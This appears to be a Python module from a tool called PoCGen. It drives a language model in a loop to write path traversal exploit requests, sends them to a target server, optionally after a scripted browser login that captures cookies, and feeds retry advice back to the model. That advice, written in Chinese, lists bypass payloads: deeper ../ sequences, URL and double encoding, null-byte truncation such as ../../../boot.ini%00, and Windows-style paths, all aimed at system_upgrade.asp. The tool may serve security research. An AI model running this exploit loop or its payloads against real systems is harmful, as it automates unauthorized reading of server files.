from __future__ import annotations

from datetime import datetime
from pathlib import Path
import time
from typing import List, Optional

from rich.console import Console

from PoCGen.config.config import SETTINGS
from PoCGen.llm.client import ChatMessage, LLMClient
from PoCGen.prompts.templates import build_prompt_path_traversal_http
from PoCGen.core.sampler import sample_target_with_playwright
from PoCGen.core.target_profile import TargetSample
from PoCGen.core.attacker_monitor import (
    AttackerMonitor,
    get_monitor_base_url,
    monitor_available,
    reset_external_monitor,
    wait_for_external_monitor,
)
from PoCGen.tools.getWeb import get_web_infomation
from PoCGen.core.models import (
    AttemptResult,
    GenerationResult,
    HTTPMessage,
    ValidationResult,
    VulnHandler,
)
from .postprocess import save_messages, split_messages
from .validators import parse_and_validate
from .remote_validator import validate_http_requests

console = Console()


class PathTraversalHTTPHandler(VulnHandler):
    """路径遍历（Path Traversal）漏洞的处理器。"""
    name = "path_traversal_http"

    def build_messages(
        self,
        description: str,
        code_texts: List[str],
        target: Optional[str],
        attacker_url: str,
        target_profile: Optional[str] = None,
        validation_feedback: Optional[str] = None,
    ) -> List[dict]:
        # 调用路径遍历的提示词构建函数
        msgs = build_prompt_path_traversal_http(
            description=description,
            code_files=code_texts,
            target=target,
            attacker_url=attacker_url,
            target_profile=target_profile,
            validation_feedback=validation_feedback,
        )
        return [m.model_dump() for m in msgs]


def generate_path_traversal_http(
    description: str,
    code_texts: List[str],
    target: Optional[str] = None,
    vuln_type: Optional[str] = None,
    temperature: float = 0.2,
    max_tokens: int = 4000,
    payload: Optional[str] = None,
    attacker_url: Optional[str] = None,
    probe_target: bool = False,
    auto_validate: bool = False,
    max_iterations: Optional[int] = None,
    stop_on_success: Optional[bool] = None,
    monitor_timeout: Optional[float] = None,
    cvenumber: Optional[str] = None,
    login_url: Optional[str] = None,
    login_username: Optional[str] = None,
    login_password: Optional[str] = None,
    login_user_field: str = "username",
    login_pass_field: str = "password",
    use_browser_login: bool = False,
    browser_headless: Optional[bool] = None,
) -> GenerationResult:
    """生成路径遍历PoC的主函数"""
    handler_key = vuln_type or PathTraversalHTTPHandler.name
    handler = PathTraversalHTTPHandler()
    
    
    if cvenumber:
        get_web_infomation(cvenumber)

    # 创建聊天日志目录
    chat_log_dir = Path(__file__).resolve().parent.parent.parent.parent / "logs" / "chat"
    chat_log_dir.mkdir(parents=True, exist_ok=True)
    chat_log_path = chat_log_dir / f"chat_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"

    def log_chat(text: str) -> None:
        """记录聊天日志"""
        try:
            ts = datetime.now().isoformat(timespec="seconds")
            with open(chat_log_path, "a", encoding="utf-8") as fh:
                fh.write(f"[{ts}] {text}\n")
        except Exception:
            pass

    log_chat(
        "Initial input:\n"
        f"description: {description}\n"
        f"target: {target or '<none>'}\n"
        f"vuln_type: {handler_key}\n"
    )

    # 设置最大尝试次数
    max_iters = max(1, max_iterations or SETTINGS.max_iterations)
    if not auto_validate:
        max_iters = 1
    
    stop_after_success = SETTINGS.stop_on_success if stop_on_success is None else stop_on_success
    out_dir = SETTINGS.save_dir
    
    # 存储尝试结果
    attempts: List[AttemptResult] = []
    feedback_text: Optional[str] = None
    overall_success = False
    last_raw_output = ""
    last_requests: List[HTTPMessage] = []
    last_saved_paths: List[str] = []
    last_validation_results: Optional[List[ValidationResult]] = None

    # 路径遍历不需要攻击者监控，所以我们不使用监控器
    # 但我们仍然可以保留监控器相关的变量以保持接口一致性
    monitor: Optional[AttackerMonitor] = None
    monitor_running = False
    
    # 构建初始对话消息
    conversation_messages: List[ChatMessage] = [ChatMessage(**m) for m in handler.build_messages(
        description,
        code_texts,
        target,
        None,
        None,
    )]
    
    # 如果启用了目标采样
    target_profile_block: Optional[str] = None
    sample_cookies_header: Optional[str] = None
    if probe_target and target:
        if use_browser_login:
            try:
                sample: TargetSample = sample_target_with_playwright(
                    target,
                    login_url=login_url,
                    login_username=login_username,
                    login_password=login_password,
                    login_user_field=login_user_field,
                    login_pass_field=login_pass_field,
                    headless=browser_headless,
                    capture_posts=True,
                    capture_cookies=True,
                    capture_socket_messages=False,
                )
                target_profile_block = sample.as_prompt_block()
                sample_cookies_header = sample.cookies_header
            except Exception as exc:
                console.print(f"[yellow]Warning: failed to probe target {target}: {exc}")
        else:
            console.print("[yellow]probe_target currently requires --browser-login; skipping target sampling")

    generation_start_ts = time.time()

    try:
        for attempt_index in range(max_iters):
            console.print(f"\n[bold]Attempt {attempt_index + 1}/{max_iters}[/bold]")

            log_chat(f"Attempt {attempt_index + 1} starting")
            if feedback_text:
                log_chat(f"Feedback provided to model:\n{feedback_text}")

            # 构建当前尝试的消息
            messages: List[ChatMessage] = list(conversation_messages)
            if target_profile_block:
                messages.append(ChatMessage(role="user", content=f"Updated target profile:\n{target_profile_block}"))
            if feedback_text:
                messages.append(ChatMessage(role="user", content=f"Feedback from previous attempt:\n{feedback_text}"))

            log_chat(
                "Model input messages:\n" +
                "\n".join(f"- {m.role}: {m.content}" for m in messages)
            )

            # 调用LLM生成请求
            client = LLMClient()
            try:
                raw_output = client.chat(messages, temperature=temperature, max_tokens=max_tokens)
            finally:
                client.close()

            # 将LLM的回复添加到对话历史
            conversation_messages.append(ChatMessage(role="assistant", content=raw_output))
            log_chat("Model output:\n" + raw_output)

            # 解析和保存生成的HTTP请求
            raw_messages = split_messages(raw_output)
            if not raw_messages and raw_output.strip():
                raw_messages = [raw_output.strip()]

            if raw_messages:
                saved_paths = save_messages(raw_messages, out_dir)
                console.print(
                    f"Saved {len(saved_paths)} PoC request(s) to: {out_dir}"
                )
            else:
                saved_paths = []
                console.print(
                    f"[yellow]Attempt {attempt_index + 1} produced no parseable HTTP request"
                )

            # 解析和验证HTTP消息
            requests: List[HTTPMessage] = []
            parse_issues: List[str] = []
            for idx, raw in enumerate(raw_messages):
                try:
                    msg, errs = parse_and_validate(raw)
                    requests.append(msg)
                    if errs:
                        for err in errs:
                            parse_issues.append(f"Request #{idx}: {err}")
                except Exception as exc:
                    parse_issues.append(f"Request #{idx} parse error: {exc}")
                    requests.append(HTTPMessage(method="", path="", version="", headers={}, body=raw))

            # 验证请求（如果启用了自动验证）
            validation_results: Optional[List[ValidationResult]] = None
            validation_error: Optional[str] = None
            if auto_validate and target and requests:
                # 如果从目标采样中获取了cookies，添加到请求中
                if sample_cookies_header:
                    for req in requests:
                        if "Cookie" not in req.headers:
                            req.headers["Cookie"] = sample_cookies_header
                
                try:
                    validation_results = validate_http_requests(requests, target)
                    
                    # 检查每个请求的结果
                    for res in validation_results:
                        if res.status_code == 200:
                            # 对于路径遍历，200状态码可能表示成功
                            console.print(
                                f"[green]Request #{res.request_index} -> HTTP {res.status_code} (Potential SUCCESS) ({res.url})"
                            )
                            # 检查响应体是否包含目标文件的内容提示
                            preview = (res.response_preview or "").strip()
                            if preview and ("system_upgrade" in preview.lower() or ".asp" in preview.lower()):
                                console.print(f"[bold green]Response may contain target file content!")
                        elif res.status_code == 302:
                            console.print(
                                f"[yellow]Request #{res.request_index} -> HTTP {res.status_code} (Redirect, may need adjustment) ({res.url})"
                            )
                        elif res.status_code and 400 <= res.status_code < 500:
                            console.print(
                                f"[red]Request #{res.request_index} -> HTTP {res.status_code} (Client error) ({res.url})"
                            )
                        elif res.status_code and 500 <= res.status_code < 600:
                            console.print(
                                f"[magenta]Request #{res.request_index} -> HTTP {res.status_code} (Server error) ({res.url})"
                            )
                        else:
                            console.print(
                                f"[white]Request #{res.request_index} -> HTTP {res.status_code} ({res.url})"
                            )
                except Exception as exc:
                    console.print(f"[yellow]Warning: validation failed: {exc}")
                    validation_results = None
                    validation_error = str(exc)

            # 检查是否成功（对于路径遍历，成功定义为：存在状态码为200的响应）
            path_traversal_success = False
            success_summary: Optional[str] = None
            if validation_results:
                for res in validation_results:
                    if res.status_code == 200:
                        path_traversal_success = True
                        preview = (res.response_preview or "").strip()[:200]
                        success_summary = f"Request #{res.request_index} returned HTTP 200"
                        if preview:
                            success_summary += f" | Preview: {preview}"
                        break

            if path_traversal_success:
                console.print("[bold green]Path traversal attempt returned HTTP 200! Potential SUCCESS![/bold green]")
                if success_summary:
                    console.print(success_summary)
            elif validation_results:
                console.print("[yellow]No HTTP 200 response received. Path traversal may not be successful.")

            # 构建下一次尝试的反馈
            feedback_for_next = None
            if not path_traversal_success and validation_results:
                feedback_for_next = _build_path_traversal_feedback(
                    parse_issues,
                    validation_results,
                    validation_error,
                )

            # 记录本次尝试
            attempts.append(
                AttemptResult(
                    attempt_index=attempt_index,
                    raw_output=raw_output,
                    requests=requests,
                    saved_paths=saved_paths,
                    validation_results=validation_results,
                    monitor_hit=path_traversal_success,  # 使用path_traversal_success作为monitor_hit的替代
                    monitor_summary=success_summary,
                    feedback=feedback_for_next,
                )
            )

            # 更新最后的状态
            last_raw_output = raw_output
            last_requests = requests
            last_saved_paths = saved_paths
            last_validation_results = validation_results
            overall_success = overall_success or path_traversal_success
            feedback_text = feedback_for_next

            # 如果成功并且设置了成功即停止
            if path_traversal_success and stop_after_success:
                console.print("[bold green]Success criteria met; stopping further attempts[/bold green]")
                break

            if attempt_index + 1 < max_iters:
                if feedback_text:
                    console.print("[cyan]Prepared feedback for next attempt (feedback logged, not printed to console)")
                elif not path_traversal_success:
                    console.print("[yellow]No specific feedback generated; will request model to adjust strategy")

        return GenerationResult(
            raw_output=last_raw_output,
            requests=last_requests,
            saved_paths=last_saved_paths,
            validation_results=last_validation_results,
            attempts=attempts,
            success=overall_success,
        )
    finally:
        if monitor:
            monitor.stop()


def _build_path_traversal_feedback(
    parse_issues: List[str],
    validation_results: Optional[List[ValidationResult]],
    validation_error: Optional[str] = None,
) -> Optional[str]:
    """为路径遍历构建尝试反馈"""
    messages: List[str] = []
    
    # 解析问题反馈
    if parse_issues:
        bullet = "\n".join(f"- {issue}" for issue in parse_issues)
        messages.append("HTTP解析/验证问题:\n" + bullet)

    # 验证结果反馈
    validation_summaries: List[str] = []
    if validation_results is not None:
        for res in validation_results:
            status = f"HTTP {res.status_code}" if res.status_code is not None else "no status"
            url = res.url or "<no url>"
            preview = (res.response_preview or "").strip()
            if preview:
                preview = preview[:200] + ("..." if len(preview) > 200 else "")
            
            detail_parts: List[str] = []
            if res.error:
                detail_parts.append(res.error)
            if preview:
                detail_parts.append(f"preview: {preview}")
            detail = "; ".join(detail_parts)
            
            if res.status_code == 200:
                line = f"Request #{res.request_index}: 成功获得200响应 -> {status} ({url})"
                if "system_upgrade" in preview.lower():
                    line += " - 响应可能包含目标文件内容！"
                else:
                    line += " - 但未检测到明显的目标文件内容，请确认payload是否正确。"
            elif res.status_code == 302:
                line = f"Request #{res.request_index}: 收到302重定向 -> {status} ({url})"
                line += "\n  建议：尝试增加 `../` 的层数，或对路径进行URL编码。"
            elif res.status_code == 401 or res.status_code == 403:
                line = f"Request #{res.request_index}: 认证/授权失败 -> {status} ({url})"
                line += "\n  建议：添加或更新认证头（如Cookie、Authorization）。"
            elif res.status_code == 404:
                line = f"Request #{res.request_index}: 文件未找到 -> {status} ({url})"
                line += "\n  建议：尝试不同的路径遍历payload，或确认参数名是否正确。"
            elif res.status_code and 500 <= res.status_code < 600:
                line = f"Request #{res.request_index}: 服务器错误 -> {status} ({url})"
                line += "\n  注意：服务器可能已崩溃或遇到内部错误。"
            else:
                line = f"Request #{res.request_index}: {status} ({url})"
            
            if detail:
                line += f"\n  {detail}"
            validation_summaries.append(line)

        if validation_summaries:
            messages.append("目标验证总结:\n" + "\n".join(f"- {item}" for item in validation_summaries))
    
    elif validation_error:
        messages.append(f"目标验证因错误未运行: {validation_error}")
    else:
        messages.append("目标验证未运行或无结果返回。")

    # 为下一次尝试提供具体调整建议
    if validation_results:
        has_302 = any(res.status_code == 302 for res in validation_results)
        has_40x = any(res.status_code and 400 <= res.status_code < 500 for res in validation_results)
        has_200 = any(res.status_code == 200 for res in validation_results)
        
        if has_302:
            messages.append(
                "调整建议（针对302重定向）：\n"
                "1. 增加路径遍历深度：在路径中添加更多 `../` 序列（如 `/public/../../../../system_upgrade.asp`）\n"
                "2. URL编码：对斜杠进行编码（`/` -> `%2f`）或对整个路径进行编码\n"
                "3. 双重编码：尝试对已编码的字符再次编码\n"
                "4. 尝试绝对路径：如 `/system_upgrade.asp` 或 `C:\\path\\to\\system_upgrade.asp`\n"
                "5. 空字节截断：在ASP环境中尝试 `../../../boot.ini%00` 风格"
            )
        elif has_40x:
            messages.append(
                "调整建议（针对40x错误）：\n"
                "1. 认证问题（401/403）：添加必要的Cookie、Session ID或Authorization头部\n"
                "2. 文件未找到（404）：尝试不同的路径组合，检查参数名是否正确\n"
                "3. 检查请求方法：确保使用正确的HTTP方法（通常是GET）\n"
                "4. 检查请求头：确保有正确的Content-Type、Referer、Origin等头部"
            )
        elif not has_200:
            messages.append(
                "通用调整建议：\n"
                "1. 检查参数名：从代码中确认正确的参数名称（如filename、file、path等）\n"
                "2. 尝试不同的payload格式：\n"
                "   - 基本：`../../../system_upgrade.asp`\n"
                "   - URL编码：`..%2f..%2f..%2fsystem_upgrade.asp`\n"
                "   - Windows风格：`..\\..\\..\\system_upgrade.asp`\n"
                "3. 检查目标路径：确认 `system_upgrade.asp` 文件的正确位置\n"
                "4. 简化请求：移除不必要的头部，只保留必需的头部"
            )

    return "\n\n".join(messages) if messages else None